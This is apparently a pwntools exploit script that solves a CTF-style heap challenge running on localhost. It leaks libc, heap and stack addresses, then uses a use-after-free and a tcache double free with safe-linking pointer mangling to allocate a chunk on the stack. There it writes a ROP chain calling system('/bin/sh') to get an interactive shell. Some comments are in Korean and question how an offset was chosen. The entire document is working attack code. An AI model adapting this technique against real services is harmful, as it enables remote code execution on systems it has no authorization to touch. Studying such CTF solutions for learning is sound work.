from pwn import *

r = remote("localhost", 31337)
# r = process('./chall_patch')
e = ELF("./chall_patch")
libc = ELF("./libc.so.6")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

sla = r.sendlineafter
sa = r.sendafter

# Libc Base Leak

sla(b'choice: ', b'-')

libc_base = int(r.recvuntil(b' is')[:-3]) - 0x816e5
slog("Libc Base", libc_base)

def create(idx, data):
    sla(b'choice: ', b'1')
    sla(b'(0-4): ', str(idx).encode())
    sa(b'creation: ', data)

def update(idx, data):
    sla(b'choice: ', b'2')
    sla(b'(0-4): ', str(idx).encode())
    sa('update: ', data)

def read_note(idx):
    sla(b'choice: ', b'3')
    sla(b'(0-4): ', str(idx).encode())
    r.recvuntil(b'data: ')
    return r.recvline()[:-1]

def delete(idx):
    sla(b'choice: ', b'4')
    sla(b'(0-4): ', str(idx).encode())

# Heap Base Address Leak

create(0, b'AAAA')
delete(0)

heap_base = u64(read_note(0).ljust(8, b'\x00')) << 12
slog("Heap Base", heap_base)

# Double Free and Leak Stack Address

payload = p64(heap_base >> 12)
payload += p64(0)
update(0, payload)
delete(0)
# 해당 target을 어떻게 판단한걸까?
target = libc_base + 0x2221f0 #+ 0x2682c0 # target + 0x10 == stack address
slog("target address", target)
update(0, p64(target ^ (heap_base >> 12)))
create(1, b'AAAA')
create(2, b'A' * 0x10)
stack = u64(read_note(2)[0x10:].ljust(8, b'\x00')) - 0x188
slog("Stack Address", stack)

system = libc_base + libc.sym['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
prdi = libc_base + 0x000000000002a3e5

# Double Free and Allocate into Stack, Use ROP

delete(0)
pause()
update(0, payload) # 리스트 초기화
pause()
delete(0)
pause()
update(0, p64(stack ^ (heap_base >> 12)))
pause()
create(3, b'AAAA')

payload = p64(target)
payload += p64(prdi) + p64(binsh)
payload += p64(prdi + 1) + p64(system) #ret + system
pause()
create(4, payload)
pause()
r.interactive()
